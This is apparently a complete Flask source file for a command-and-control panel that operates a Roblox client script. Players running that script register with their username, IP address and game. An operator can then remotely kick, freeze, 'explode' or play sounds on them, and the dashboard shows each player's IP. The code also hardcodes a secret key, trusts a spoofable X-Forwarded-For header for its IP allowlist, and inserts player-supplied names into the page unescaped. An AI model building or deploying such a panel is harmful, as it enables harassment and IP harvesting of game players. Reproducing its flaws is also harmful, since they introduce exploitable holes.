from flask import Flask, request, jsonify, render_template_string, abort
from flask_socketio import SocketIO, emit
import time
import eventlet
from datetime import datetime

eventlet.monkey_patch()

app = Flask(__name__)
app.config["SECRET_KEY"] = "super_secret_key_123"
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet")

# CONFIGURATION
ALLOWED_IPS = {"37.66.149.36", "91.170.86.224"}

connected_players = {}
pending_commands = {}
history_logs = [] # Persistant tant que le script tourne

def add_to_history(action, username, details=""):
    log = {
        "id": str(time.time()),
        "time": datetime.now().strftime("%H:%M:%S"),
        "user": username,
        "action": action,
        "details": details
    }
    history_logs.insert(0, log)
    if len(history_logs) > 100: history_logs.pop()
    socketio.emit("update_history", history_logs)

def check_ip():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if ip and "," in ip:
        ip = ip.split(",")[0].strip()
    if ip not in ALLOWED_IPS:
        abort(403)

@app.errorhandler(403)
def access_denied(e):
    detected = request.headers.get("X-Forwarded-For", request.remote_addr)
    return f'<body style="background:#000;color:red;text-align:center;padding-top:15%"><h1>Accès refusé</h1><p>IP: {detected}</p></body>', 403

HTML = """<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<title>ROBLOX CONTROL PANEL ULTIMATE</title>
<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600&family=Inter:wght@400;600&display=swap" rel="stylesheet">
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:Inter,sans-serif;background:radial-gradient(circle at top,#0f2027,#000);color:#fff;min-height:100vh}
.container{max-width:1600px;margin:auto;padding:40px}
h1{font-family:Orbitron;font-size:3rem;text-align:center;color:#00ffaa;text-shadow:0 0 30px #00ffaa;margin-bottom:20px}
.main-layout{display:grid;grid-template-columns: 1fr 400px; gap:30px}
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(380px,1fr));gap:25px}
.card{background:rgba(20,20,20,.9);border-radius:18px;padding:25px;box-shadow:0 0 30px rgba(0,0,0,.7);position:relative;transition:0.3s}
.trash-player{position:absolute;top:15px;right:15px;background:none;border:none;color:#444;cursor:pointer;font-size:1.2rem}
.trash-player:hover{color:#ff3366}
.status{display:flex;align-items:center;gap:10px;margin-bottom:15px}
.dot{width:14px;height:14px;border-radius:50%;background:red}
.dot.online{background:#00ffaa;box-shadow:0 0 18px #00ffaa}
.name a{font-size:1.6rem;font-weight:600;color:#ffcc00;text-decoration:none}
.name a:hover{text-decoration:underline}
.info{font-size:0.9rem;color:#aaa;margin-bottom:20px;line-height:1.6}
.info b{color:#eee}
.info a{color:#00ffaa;text-decoration:none}
.category{font-weight:bold;color:#00ffaa;margin:15px 0 10px;font-size:1rem;text-transform:uppercase}
button.kick-btn{padding:10px;border:none;border-radius:10px;cursor:pointer;font-weight:bold;font-size:0.8rem;color:white;margin-bottom:5px;transition:0.2s}
button.kick-btn:hover{filter:brightness(1.2);transform:scale(1.02)}
.history-panel{background:rgba(10,10,10,0.9);border:1px solid #222;border-radius:18px;padding:20px;height:750px;display:flex;flex-direction:column}
.history-list{flex-grow:1;overflow-y:auto;font-size:0.85rem}
.history-item{padding:10px;border-bottom:1px solid #222;display:flex;justify-content:space-between;align-items:center}
.hist-time{color:#555;margin-right:10px}
.modal{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.8);align-items:center;justify-content:center;z-index:1000}
.modal.active{display:flex}
.modal-content{background:#111;padding:30px;border-radius:20px;width:90%;max-width:450px;border:1px solid #333}
.modal-content input{width:100%;padding:15px;border-radius:12px;border:none;background:#222;color:white;margin-bottom:20px}
</style>
</head>
<body>
<div class="container">
    <h1>ROBLOX CONTROL PANEL</h1>
    <div class="main-layout">
        <div>
            <h2 class="category" style="margin-top:0">Manage Players</h2>
            <div class="grid" id="players"></div>
        </div>
        <div>
            <div style="display:flex;justify-content:space-between;align-items:center">
                <h2 class="category" style="margin-top:0">History</h2>
                <button onclick="clearHistory()" style="background:none;border:none;color:#555;cursor:pointer;font-weight:bold">CLEAR ALL</button>
            </div>
            <div class="history-panel"><div class="history-list" id="history-list"></div></div>
        </div>
    </div>
</div>

<div class="modal" id="kickModal"><div class="modal-content">
    <h2 style="color:#ff3366">Kick Player</h2><br>
    <input type="text" id="kickReason" placeholder="Reason..."><br>
    <div style="display:flex;gap:10px">
        <button style="flex:1;padding:12px;border-radius:10px;cursor:pointer" onclick="closeModal('kickModal')">Cancel</button>
        <button style="flex:1;background:#ff3366;color:white;border:none;border-radius:10px;cursor:pointer;font-weight:bold" id="confirmKickBtn">Confirm Kick</button>
    </div>
</div></div>

<div class="modal" id="soundModal"><div class="modal-content">
    <h2 style="color:orange">Play Sound</h2><br>
    <input type="text" id="soundAssetId" placeholder="Asset ID"><br>
    <div style="display:flex;gap:10px">
        <button style="flex:1;padding:12px;border-radius:10px" onclick="closeModal('soundModal')">Cancel</button>
        <button style="flex:1;background:orange;color:white;border:none;border-radius:10px;font-weight:bold" id="confirmSoundBtn">Play</button>
    </div>
</div></div>

<script>
const socket = io();
let selectedUid = null;

socket.on('connect', () => { console.log("Re-synchronisation..."); });

function openKickModal(uid) { selectedUid = uid; document.getElementById('kickModal').classList.add('active'); }
function openSoundModal(uid) { selectedUid = uid; document.getElementById('soundModal').classList.add('active'); }
function closeModal(id) { document.getElementById(id).classList.remove('active'); selectedUid = null; }

function deletePlayer(uid) { fetch("/delete_player", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({userid: uid})}); }

function sendTroll(uid, cmd, assetId = null) {
    fetch("/troll", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({userid: uid, cmd: cmd, assetId: assetId})});
}

document.getElementById('confirmKickBtn').onclick = () => {
    sendTroll(selectedUid, 'kick', document.getElementById('kickReason').value || "Kicked by admin");
    closeModal('kickModal');
};
document.getElementById('confirmSoundBtn').onclick = () => {
    sendTroll(selectedUid, 'playsound', document.getElementById('soundAssetId').value);
    closeModal('soundModal');
};

function clearHistory() { fetch("/clear_history", {method: "POST"}); }
function deleteLog(id) { fetch("/clear_history", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({log_id: id})}); }

socket.on("update", (data) => {
    const grid = document.getElementById("players");
    const currentIds = new Set(Object.keys(data.players));
    Object.entries(data.players).forEach(([id, p]) => {
        let card = document.getElementById(`card_${id}`);
        if (!card) {
            card = document.createElement("div"); card.className = "card"; card.id = `card_${id}`; grid.appendChild(card);
        }
        card.innerHTML = `
            <button class="trash-player" onclick="deletePlayer('${id}')">🗑️</button>
            <div class="status"><div class="dot ${p.online ? "online" : ""}"></div><span>${p.online ? "Online" : "Offline"}</span></div>
            <div class="name"><a href="https://www.roblox.com/fr/users/${id}/profile" target="_blank">${p.username}</a></div>
            <div class="info">
                <b>IP :</b> ${p.ip}<br>
                <b>Game :</b> <a href="https://www.roblox.com/fr/games/${p.gameId}" target="_blank">${p.gameName || 'View Game'}</a><br>
                <b>Executor :</b> ${p.executor}
            </div>
            <div class="category">Trolls</div>
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;">
                <button class="kick-btn" style="background:linear-gradient(45deg,#ff3366,#ff5588)" onclick="openKickModal('${id}')">KICK</button>
                <button class="kick-btn" style="background:linear-gradient(45deg,#ff00ff,#aa00aa)" onclick="sendTroll('${id}','freeze')">FREEZE</button>
                <button class="kick-btn" style="background:linear-gradient(45deg,#00ffff,#00aaaa)" onclick="sendTroll('${id}','spin')">SPIN</button>
                <button class="kick-btn" style="background:linear-gradient(45deg,#ffff00,#ff9900);color:black" onclick="sendTroll('${id}','jump')">JUMP</button>
                <button class="kick-btn" style="background:linear-gradient(45deg,#88ff88,#55aa55);color:black" onclick="sendTroll('${id}','rainbow')">RAINBOW</button>
                <button class="kick-btn" style="background:linear-gradient(45deg,#ff5555,#aa0000)" onclick="sendTroll('${id}','explode')">EXPLODE</button>
                <button class="kick-btn" style="background:linear-gradient(45deg,#5555ff,#0000aa)" onclick="sendTroll('${id}','invisible')">INVISIBLE</button>
                <button class="kick-btn" style="background:orange" onclick="openSoundModal('${id}')">PLAY SOUND</button>
            </div>
            <div class="category">Undo</div>
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;">
                <button class="kick-btn" style="background:#444" onclick="sendTroll('${id}','unfreeze')">UNFREEZE</button>
                <button class="kick-btn" style="background:#444" onclick="sendTroll('${id}','unspin')">UNSPIN</button>
                <button class="kick-btn" style="background:#444" onclick="sendTroll('${id}','unrainbow')">UNRAINBOW</button>
                <button class="kick-btn" style="background:#444" onclick="sendTroll('${id}','uninvisible')">UNINVISIBLE</button>
                <button class="kick-btn" style="background:#444" onclick="sendTroll('${id}','stopsound')">STOP SOUND</button>
            </div>
        `;
    });
    document.querySelectorAll('.card').forEach(c => { if (!currentIds.has(c.id.replace('card_', ''))) c.remove(); });
});

socket.on("update_history", (logs) => {
    const list = document.getElementById("history-list");
    list.innerHTML = logs.map(log => `
        <div class="history-item">
            <div><span class="hist-time">[${log.time}]</span><b>${log.user}</b>: ${log.action}</div>
            <div class="del-hist" onclick="deleteLog('${log.id}')">✕</div>
        </div>
    `).join('');
});
</script>
</body>
</html>"""

@app.route("/")
def index():
    check_ip()
    return render_template_string(HTML)

@socketio.on('connect')
def handle_connect():
    emit("update_history", history_logs)

@app.route("/api", methods=["GET", "POST"])
def api():
    now = time.time()
    if request.method == "POST":
        d = request.get_json(silent=True) or {}
        uid = str(d.get("userid", ""))
        if d.get("action") == "register" and uid:
            if uid not in connected_players:
                add_to_history("Connexion", d.get("username", "Inconnu"))
            connected_players[uid] = {
                "username": d.get("username", "Unknown"),
                "ip": d.get("ip", "Unknown"),
                "gameName": d.get("gameName", "Click to view"), # Sera mis à jour par le script
                "gameId": d.get("gameId", "0"),
                "executor": d.get("executor", "Unknown"),
                "last": now, "online": True
            }
        elif d.get("action") == "heartbeat" and uid in connected_players:
            connected_players[uid]["last"] = now
        return jsonify({"ok": True})

    if request.method == "GET":
        uid = str(request.args.get("userid", ""))
        if uid in pending_commands:
            cmd_data = pending_commands.pop(uid)
            return jsonify(cmd_data if isinstance(cmd_data, dict) else {"command": cmd_data})
        return jsonify({})

@app.route("/troll", methods=["POST"])
def troll():
    check_ip()
    d = request.get_json()
    uid, cmd = str(d["userid"]), d["cmd"]
    assetId = d.get("assetId")
    pending_commands[uid] = {"command": cmd, "assetId": assetId} if assetId else cmd
    name = connected_players.get(uid, {}).get("username", "Unknown")
    add_to_history(f"Action: {cmd.upper()}", name)
    return jsonify({"sent": True})

@app.route("/delete_player", methods=["POST"])
def delete_player():
    check_ip()
    uid = str(request.get_json()["userid"])
    if uid in connected_players:
        name = connected_players[uid]["username"]
        del connected_players[uid]
        add_to_history("Supprimé", name)
    return jsonify({"ok": True})

@app.route("/clear_history", methods=["POST"])
def clear_history():
    check_ip()
    global history_logs
    data = request.get_json(silent=True)
    if data and "log_id" in data:
        history_logs = [l for l in history_logs if l["id"] != data["log_id"]]
    else:
        history_logs.clear()
    socketio.emit("update_history", history_logs)
    return jsonify({"ok": True})

def broadcast_loop():
    while True:
        now = time.time()
        to_remove = []
        for uid, p in connected_players.items():
            p["online"] = (now - p["last"] < 15)
            if now - p["last"] > 60: to_remove.append(uid)
        for uid in to_remove:
            name = connected_players[uid]["username"]
            del connected_players[uid]
            add_to_history("Déconnexion", name)
        socketio.emit("update", {"players": connected_players})
        socketio.sleep(2)

if __name__ == "__main__":
    socketio.start_background_task(broadcast_loop)
    socketio.run(app, host="0.0.0.0", port=5000)
